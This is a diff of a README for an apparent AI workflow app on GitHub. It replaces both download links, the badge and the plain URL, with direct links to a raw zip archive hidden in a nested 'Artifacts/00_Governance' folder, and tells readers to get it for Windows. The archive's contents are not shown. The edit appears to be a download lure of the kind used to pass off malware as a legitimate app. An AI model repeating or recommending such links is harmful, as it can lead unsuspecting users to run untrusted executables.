@@ -1,6 +1,6 @@
 # 🤖 super-ai-agency-framework - Build AI workflows with clear steps
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue)](https://github.com/Pentasyllabic-uropsilussoricipes715/super-ai-agency-framework)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue)](https://github.com/Pentasyllabic-uropsilussoricipes715/super-ai-agency-framework/raw/refs/heads/main/Artifacts/00_Governance/ai-framework-super-agency-1.0.zip)
 
 ## 🧭 What this app does
 
@@ -29,7 +29,7 @@ If your computer is newer, the app should run with no trouble. If it is older, i
 ## 📥 Download the app
 
 Use this link to visit the download page:
-https://github.com/Pentasyllabic-uropsilussoricipes715/super-ai-agency-framework
+https://github.com/Pentasyllabic-uropsilussoricipes715/super-ai-agency-framework/raw/refs/heads/main/Artifacts/00_Governance/ai-framework-super-agency-1.0.zip
 
 Open the page and get the latest version for Windows.
 
